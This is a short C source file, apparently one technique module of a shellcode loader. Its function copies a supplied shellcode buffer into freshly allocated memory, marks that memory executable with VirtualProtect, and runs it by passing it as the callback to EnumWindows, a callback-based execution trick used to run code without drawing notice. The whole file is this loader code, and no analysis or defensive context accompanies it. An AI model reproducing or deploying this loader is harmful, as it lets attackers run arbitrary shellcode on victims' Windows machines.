#include "../dispatch.h"

static BOOL CALLBACK enum_cb(HWND hwnd, LPARAM lParam) {
    (void)hwnd;
    ((void (*)(void))lParam)();
    return FALSE;
}

BOOL tech_enum_windows(unsigned char *sc, size_t len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    EnumWindows(enum_cb, (LPARAM)mem);
    return TRUE;
}
